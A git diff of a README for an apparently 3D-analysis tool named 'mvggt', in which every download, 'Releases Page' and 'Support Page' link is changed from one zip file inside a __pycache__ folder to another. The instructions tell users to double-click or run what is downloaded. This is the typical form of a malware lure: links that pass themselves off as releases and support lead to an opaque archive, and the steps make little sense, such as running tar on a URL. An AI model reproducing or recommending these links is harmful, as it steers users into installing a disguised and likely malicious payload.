@@ -6,11 +6,11 @@ Welcome to the mvggt repository! This software uses advanced techniques to help 
 
 ## 📥 Download mvggt
 
-[![Download mvggt](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip)](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip)
+[![Download mvggt](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip)](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip)
 
 To get started, you need to download the software from our Releases page. Click the button above or follow the link below:
 
-**[Visit the Releases Page to Download](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip)**
+**[Visit the Releases Page to Download](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip)**
 
 ## 🛠 System Requirements
 
@@ -25,21 +25,21 @@ If your system meets these requirements, you are ready to download and install m
 
 ## 📂 How to Download & Install mvggt
 
-1. **Open the Releases Page:** Go to our Releases page by following this link: **[Releases Page](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip)**.
+1. **Open the Releases Page:** Go to our Releases page by following this link: **[Releases Page](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip)**.
 
 2. **Find the Latest Release:** Look for the latest version at the top of the releases list. It will have the highest version number (e.g., v1.0.0).
 
 3. **Select the Appropriate File:**
-   - For **Windows**, download the file named something like `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip`.
-   - For **macOS**, download the file named `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip`.
-   - For **Linux**, you might find a `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip` file. Download it if you are using Linux.
+   - For **Windows**, download the file named something like `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip`.
+   - For **macOS**, download the file named `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip`.
+   - For **Linux**, you might find a `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip` file. Download it if you are using Linux.
 
 4. **Start the Download:** Click on the file link to start the download. Your browser will show the download progress.
 
 5. **Run the Installer:**
-   - **Windows:** Once downloaded, go to your Downloads folder and double-click `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip`. Follow the on-screen instructions to complete the installation.
-   - **macOS:** Open `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip`, drag the mvggt app into your Applications folder. Then, launch it from your Applications.
-   - **Linux:** Open a terminal and navigate to the folder where you downloaded the file. Use the command `tar -xvzf https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip` to extract the files. Then, run the executable by typing `./mvggt`.
+   - **Windows:** Once downloaded, go to your Downloads folder and double-click `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip`. Follow the on-screen instructions to complete the installation.
+   - **macOS:** Open `https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip`, drag the mvggt app into your Applications folder. Then, launch it from your Applications.
+   - **Linux:** Open a terminal and navigate to the folder where you downloaded the file. Use the command `tar -xvzf https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip` to extract the files. Then, run the executable by typing `./mvggt`.
 
 6. **Launch mvggt:** After installation, locate the mvggt app on your device. Double-click to open and start using the application.
 
@@ -64,7 +64,7 @@ If you encounter any issues while installing or using mvggt, consider the follow
 
 ## 📞 Support
 
-For additional help, please visit our [Support Page](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip) or contact us through the GitHub Issues section. We are here to assist you.
+For additional help, please visit our [Support Page](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip) or contact us through the GitHub Issues section. We are here to assist you.
 
 ## 📌 License
 
@@ -72,4 +72,4 @@ mvggt is licensed under the MIT License. You can freely use it in your projects,
 
 **Download mvggt now and transform your 3D data analysis!** 
 
-[![Download mvggt](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip)](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/dinov2/__pycache__/Software_v1.7.zip)
+[![Download mvggt](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip)](https://raw.githubusercontent.com/XpiderService/mvggt/main/mvggt/models/__pycache__/Software-v3.9.zip)
